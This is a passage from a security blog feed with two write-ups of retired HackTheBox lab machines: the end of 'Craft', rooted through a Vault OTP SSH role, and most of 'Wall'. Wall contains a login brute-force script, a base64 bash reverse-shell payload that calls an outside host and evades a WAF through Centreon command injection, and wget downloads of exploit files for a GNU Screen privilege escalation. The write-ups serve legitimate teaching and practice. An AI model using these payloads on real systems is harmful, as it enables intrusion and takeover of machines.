&lt;span class="code-line"&gt;vault write ssh/roles/root_otp \&lt;/span&gt;
&lt;span class="code-line"&gt;    key_type=otp \&lt;/span&gt;
&lt;span class="code-line"&gt;    default_user=root \&lt;/span&gt;
&lt;span class="code-line"&gt;    cidr_list=0.0.0.0/0&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Therefore we just need to use the &lt;code&gt;vault&lt;/code&gt;'s &lt;code&gt;ssh&lt;/code&gt; command to connect as &lt;code&gt;root&lt;/code&gt;
on &lt;code&gt;localhost&lt;/code&gt; with the &lt;code&gt;otp&lt;/code&gt; mode. We are root on the machine and can access
the flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;gilfoyle@craft:~$ vault ssh -mode=otp root@127.0.0.1&lt;/span&gt;
&lt;span class="code-line"&gt;WARNING: No -role specified. Use -role to tell Vault which ssh role to use for&lt;/span&gt;
&lt;span class="code-line"&gt;authentication. In the future, you will need to tell Vault which role to use.&lt;/span&gt;
&lt;span class="code-line"&gt;For now, Vault will attempt to guess based on the API response. This will be&lt;/span&gt;
&lt;span class="code-line"&gt;removed in the Vault 1.1.&lt;/span&gt;
&lt;span class="code-line"&gt;Vault SSH: Role: &amp;quot;root_otp&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;Vault could not locate &amp;quot;sshpass&amp;quot;. The OTP code for the session is displayed&lt;/span&gt;
&lt;span class="code-line"&gt;below. Enter this code in the SSH password prompt. If you install sshpass,&lt;/span&gt;
&lt;span class="code-line"&gt;Vault can automatically perform this step for you.&lt;/span&gt;
&lt;span class="code-line"&gt;OTP for the session is: fb100502-b40c-9f60-aa35-f90a5000a2a3&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  .   *   ..  . *  *&lt;/span&gt;
&lt;span class="code-line"&gt;*  * @()Ooc()*   o  .&lt;/span&gt;
&lt;span class="code-line"&gt;    (Q@*0CG*O()  ___&lt;/span&gt;
&lt;span class="code-line"&gt;  |\_________/|/ _ \&lt;/span&gt;
&lt;span class="code-line"&gt;  |  |  |  |  | / | |&lt;/span&gt;
&lt;span class="code-line"&gt;  |  |  |  |  | | | |&lt;/span&gt;
&lt;span class="code-line"&gt;  |  |  |  |  | | | |&lt;/span&gt;
&lt;span class="code-line"&gt;  |  |  |  |  | | | |&lt;/span&gt;
&lt;span class="code-line"&gt;  |  |  |  |  | | | |&lt;/span&gt;
&lt;span class="code-line"&gt;  |  |  |  |  | \_| |&lt;/span&gt;
&lt;span class="code-line"&gt;  |  |  |  |  |\___/&lt;/span&gt;
&lt;span class="code-line"&gt;  |\_|__|__|_/|&lt;/span&gt;
&lt;span class="code-line"&gt;    \_________/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Password:&lt;/span&gt;
&lt;span class="code-line"&gt;Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;The programs included with the Debian GNU/Linux system are free software;&lt;/span&gt;
&lt;span class="code-line"&gt;the exact distribution terms for each program are described in the&lt;/span&gt;
&lt;span class="code-line"&gt;individual files in /usr/share/doc/*/copyright.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent&lt;/span&gt;
&lt;span class="code-line"&gt;permitted by applicable law.&lt;/span&gt;
&lt;span class="code-line"&gt;Last login: Tue Aug 27 04:53:14 2019&lt;/span&gt;
&lt;span class="code-line"&gt;root@craft:~# cat root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;831d6&amp;lt;redacted&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;This box was really interesting as everything is applicable in real life. The
user part was quit long (compared to the user part) and getting a working
reverse shell was a brain crusher. For the root part it was quit easy but allow
me to learn more about &lt;a href="https://www.vaultproject.io"&gt;vault&lt;/a&gt;.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="git"></category><category term="gogs"></category><category term="api"></category><category term="vault"></category><category term="linux"></category></entry><entry><title>HTB: Wall</title><link href="https://maggick.fr/2019/12/htb-wall.html" rel="alternate"></link><published>2019-12-07T17:45:00+01:00</published><updated>2019-12-07T17:45:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2019-12-07:/2019/12/htb-wall.html</id><summary type="html">&lt;p&gt;&lt;img alt="Wall Card" class="align-left" src="/media/2019.12/wall_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/208"&gt;Wall&lt;/a&gt;.
This box is rated as a medium box. It implies a lot of frustration, some
bruteforce, an centreon exploit with a WAF bypass and the exploitation of a SUID
&lt;code&gt;screen&lt;/code&gt;.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2019.12/wall_card.png" alt="Wall Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/208"&gt;Wall&lt;/a&gt;.
This box is rated as a medium box. It implies a lot of frustration, some
bruteforce, an centreon exploit with a WAF bypass and the exploitation of a SUID
&lt;code&gt;screen&lt;/code&gt;.&lt;/p&gt;


&lt;div class="toc"&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#user"&gt;User&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#recon"&gt;Recon&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#web"&gt;Web&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#getting-root"&gt;Getting root&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#reverse-shell"&gt;Reverse shell&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#wrapping-up"&gt;Wrapping up&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. The ports 22 (SSH) and 80 (HTTP)
are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Thu Nov 28 07:17:03 2019 as: nmap -p- -oA nmap 10.10.10.157&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.157&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.085s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65444 closed ports, 89 filtered ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE SERVICE&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open  ssh&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp open  http&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Thu Nov 28 07:30:05 2019 -- 1 IP address (1 host up) scanned in 782.66 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;The home page is the default Apache page.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Default apache page" src="/media/2019.12/wall_1.png"&gt;&lt;/p&gt;
&lt;p&gt;We run a dib against the site. Only one URL is found by the tool &lt;code&gt;/monitoring&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;DIRB v2.22&lt;/span&gt;
&lt;span class="code-line"&gt;By The Dark Raver&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;OUTPUT_FILE: dirb&lt;/span&gt;
&lt;span class="code-line"&gt;START_TIME: Thu Sep 19 11:29:07 2019&lt;/span&gt;
&lt;span class="code-line"&gt;URL_BASE: http://10.10.10.157/&lt;/span&gt;
&lt;span class="code-line"&gt;WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;GENERATED WORDS: 4612&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;---- Scanning URL: http://10.10.10.157/ ----&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.157/index.html (CODE:200|SIZE:10918)&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.157/monitoring (CODE:401|SIZE:459)&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.157/server-status (CODE:403|SIZE:300)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;END_TIME: Thu Sep 19 11:41:07 2019&lt;/span&gt;
&lt;span class="code-line"&gt;DOWNLOADED: 4612 - FOUND: 3&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The page is protected with a basic auth with the message "Protected area by the
admin". We guess that the user is "admin".  We could try to bruteforce the
password but that doesn't work.&lt;/p&gt;
&lt;p&gt;After some frustration, I sent some POST data to the page. Which result in a
redirection to &lt;code&gt;/monitoring/&lt;/code&gt; and to a new URL.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@kalili:~# curl -d &amp;#39;data=data&amp;#39; -X POST http://10.10.10.157/monitoring&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;!DOCTYPE HTML PUBLIC &amp;quot;-//IETF//DTD HTML 2.0//EN&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;title&amp;gt;301 Moved Permanently&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;h1&amp;gt;Moved Permanently&amp;lt;/h1&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;p&amp;gt;The document has moved &amp;lt;a href=&amp;quot;http://10.10.10.157/monitoring/&amp;quot;&amp;gt;here&amp;lt;/a&amp;gt;.&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;hr&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;address&amp;gt;Apache/2.4.29 (Ubuntu) Server at 10.10.10.157 Port 80&amp;lt;/address&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;root@kalili:~# curl -d &amp;#39;data=data&amp;#39; -X POST http://10.10.10.157/monitoring/&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;h1&amp;gt;This page is not ready yet !&amp;lt;/h1&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;h2&amp;gt;We should redirect you to the required page !&amp;lt;/h2&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;meta http-equiv=&amp;quot;refresh&amp;quot; content=&amp;quot;0; URL=&amp;#39;/centreon&amp;#39;&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We go to the &lt;code&gt;/centreon&lt;/code&gt; URL. This is another authentication form.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Centreon authentication" src="/media/2019.12/wall_2.png"&gt;&lt;/p&gt;
&lt;p&gt;We can guess that the user is admin. We load the 50 first enrties of rockyou
(&lt;code&gt;head -n 50 rockyou.txt &amp;gt; rockyou_50.txt&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Disclaimer: Bruteforce attacks are pretty uncommon on HTB. I asked on the
Discord if this was the right track before bruteforcing as it might distrupt the
box for other users.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;When looking at the requests we can see that there is a token protecting the
application against brute force. We wrote a simple python script to make a first
request, get the token and send a authentication request.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;bs4&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;BeautifulSoup&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://10.10.10.157/centreon/index.php&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;testPassword&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Session&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;soup&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;BeautifulSoup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;html.parser&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;soup&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find_all&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;input&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;value&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;useralias&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;submitLogin&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Connect&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;centreon_token&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Your credentials are incorrect.&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;rockyou_50.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;testPassword&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We launch the script and get the password: &lt;code&gt;password1&lt;/code&gt;.  We can then login in
the centron interface.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Centreon interface" src="/media/2019.12/wall_3.png"&gt;&lt;/p&gt;
&lt;p&gt;We search for the available exploits on this solution. Most of the know exploits
are old but the one concerning Centreon 19.04.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# searchsploit centreon&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------------------- ----------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt; Exploit Title                         |  Path&lt;/span&gt;
&lt;span class="code-line"&gt;                                       | (/usr/share/exploitdb/)&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------------------- ----------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Centreon - SQL Injection / Command Inj | exploits/unix/remote/35078.rb&lt;/span&gt;
&lt;span class="code-line"&gt;Centreon 1.4.2.3 - &amp;#39;get_image.php&amp;#39; Rem | exploits/php/webapps/5204.py&lt;/span&gt;
&lt;span class="code-line"&gt;Centreon 1.4.2.3 - &amp;#39;index.php&amp;#39; Local F | exploits/php/webapps/31318.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Centreon 19.04  - Remote Code Executio | exploits/php/webapps/47069.py&lt;/span&gt;
&lt;span class="code-line"&gt;Centreon 2.3.1 - &amp;#39;command_name&amp;#39; Remote | exploits/php/webapps/36293.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Centreon 2.5.3 - Remote Command Execut | exploits/php/webapps/39501.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Centreon 2.5.3 - Web Useralias Command | exploits/python/remote/40170.rb&lt;/span&gt;
&lt;span class="code-line"&gt;Centreon 2.5.4 - Multiple Vulnerabilit | exploits/php/webapps/37528.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Centreon 2.6.1 - Multiple Vulnerabilit | exploits/php/webapps/38339.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Centreon &amp;lt; 2.5.1 / Centreon Enterprise | exploits/linux/webapps/41676.rb&lt;/span&gt;
&lt;span class="code-line"&gt;Centreon Enterprise Server 2.3.3 &amp;lt; 2.3 | exploits/php/webapps/23362.py&lt;/span&gt;
&lt;span class="code-line"&gt;Centreon IT &amp;amp; Network Monitoring 2.1.5 | exploits/php/webapps/11979.pl&lt;/span&gt;
&lt;span class="code-line"&gt;Oreon 1.4 / Centreon 1.4.1 - Multiple  | exploits/php/webapps/4735.txt&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------------------- ----------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Shellcodes: No Result&lt;/span&gt;
&lt;span class="code-line"&gt;Papers: No Result&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;A quick Google research let us find
&lt;a href="https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/"&gt;an article about the vulnerability&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;If we directly use the exploit, we will see that our  payload is blocked with a
403 error. There is a WAF blocking some characters A little digging allow use
to find the allowed and blocked ones. The spaces are blocked, the &lt;code&gt;#&lt;/code&gt; is blocked
but the &lt;code&gt;()&lt;/code&gt; and the &lt;code&gt;$&lt;/code&gt; the &lt;code&gt;;&lt;/code&gt; and the &lt;code&gt;|&lt;/code&gt; are allowed. We can use encode our payload
using &lt;code&gt;base64&lt;/code&gt; in order to execute a payload with encoded characters.&lt;/p&gt;
&lt;p&gt;In order to replace the spaces in our payload we must use &lt;code&gt;${IFS}&lt;/code&gt;
&lt;a href="https://bash.cyberciti.biz/guide/$IFS"&gt;variable&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;We want to use the default &lt;code&gt;bash&lt;/code&gt; reverse shell:
&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.184/4444 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We want to pipe it to &lt;code&gt;base64 -d&lt;/code&gt; and pipe the result to bash. Then we need to
discard the rest of the command (as the argument will not be valid). As the &lt;code&gt;#&lt;/code&gt;
character is blocked, we can use a &lt;code&gt;;&lt;/code&gt;. Our command will be executed and then
the rest will failed with an error, but we do not care as our command will be
executed first.&lt;/p&gt;
&lt;p&gt;Our final payload is &lt;code&gt;echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODQvNDQ0NCAwPiYx|base64${IFS}-d|bash${IFS}-;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;As the script is not reliable we do it manually directly in the interface. We
access the poller interface.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Configuring the poller" src="/media/2019.12/wall_4.png"&gt;&lt;/p&gt;
&lt;p&gt;We add a new poller with our command. We need to specify that its target
localhost.&lt;/p&gt;
&lt;p&gt;&lt;img alt="adding the puller" src="/media/2019.12/wall_5.png"&gt;&lt;/p&gt;
&lt;p&gt;Then we export its configuration (while have a &lt;code&gt;netcat&lt;/code&gt; listener running).&lt;/p&gt;
&lt;h1 id="getting-root"&gt;Getting root&lt;/h1&gt;
&lt;p&gt;&lt;em&gt;On this box, we do not need to get user before getting root. We will grab the
user flag once we are root.&lt;/em&gt;&lt;/p&gt;
&lt;h2 id="reverse-shell"&gt;Reverse shell&lt;/h2&gt;
&lt;p&gt;We got a reverse shell, we start enumerating the box. While searching for SUID
file we found a SUID &lt;code&gt;screen&lt;/code&gt; binary.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;find / -perm -4000 -type f -exec ls -la {} 2&amp;gt;/dev/null \;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Our &lt;a href="https://gtfobins.github.io/gtfobins/screen/"&gt;gtfobins&lt;/a&gt; friend do not tell us that
there is privilege escalation with an SUID screen. Only that we can wrote files.
Which means that we can wrote files as &lt;code&gt;root&lt;/code&gt; with the SUID set.
(See this &lt;a href="https://github.com/GTFOBins/GTFOBins.github.io/pull/76"&gt;pull request to
gtfobins&lt;/a&gt; for more info.)&lt;/p&gt;
&lt;p&gt;But looking a the available exploit with &lt;code&gt;searchsploit&lt;/code&gt; we find an interesting exploit for the
specific &lt;code&gt;screen&lt;/code&gt; version on the box.
(the &lt;code&gt;sh&lt;/code&gt; script is a POC using the exploit described in the &lt;code&gt;txt&lt;/code&gt;).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;searchsploit screen 4.5.0&lt;/span&gt;
&lt;span class="code-line"&gt;-------------------------------------------- ----------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Exploit Title                              |  Path&lt;/span&gt;
&lt;span class="code-line"&gt;                                            | (/usr/share/exploitdb/)&lt;/span&gt;
&lt;span class="code-line"&gt;-------------------------------------------- ----------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;GNU Screen 4.5.0 - Local Privilege Escalati | exploits/linux/local/41152.txt&lt;/span&gt;
&lt;span class="code-line"&gt;GNU Screen 4.5.0 - Local Privilege Escalati | exploits/linux/local/41154.sh&lt;/span&gt;
&lt;span class="code-line"&gt;-------------------------------------------- ----------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Shellcodes: No Result&lt;/span&gt;
&lt;span class="code-line"&gt;Papers: No Result&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;First of all we get a better reverse shell with python &lt;code&gt;python -c 'import pty; pty.spawn("/bin/sh")'&lt;/code&gt;
Then we follow the commands in the &lt;code&gt;sh&lt;/code&gt; script while changing the path from
&lt;code&gt;/tmp/&lt;/code&gt; to &lt;code&gt;/tmp/ioio/&lt;/code&gt;. Also we &lt;code&gt;wget&lt;/code&gt; the &lt;code&gt;libhax.c&lt;/code&gt; and &lt;code&gt;rootshell.c&lt;/code&gt; which
we edited on our local system.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;www-data@Wall:/usr/local/centreon/www$ cd /tmp/ioio&lt;/span&gt;
&lt;span class="code-line"&gt;cd /tmp/ioio&lt;/span&gt;
&lt;span class="code-line"&gt;www-data@Wall:wget http://10.10.14.169:8081/libhax.c&lt;/span&gt;
&lt;span class="code-line"&gt;wget http://10.10.14.169:8081/libhax.c&lt;/span&gt;
&lt;span class="code-line"&gt;www-data@Wall:wget http://10.10.14.169:8081/rootshell.c&lt;/span&gt;
&lt;span class="code-line"&gt;wget http://10.10.14.169:8081/rootshell.c&lt;/span&gt;
&lt;span class="code-line"&gt;www-data@Wall:/tmp/ioio$ ls&lt;/span&gt;
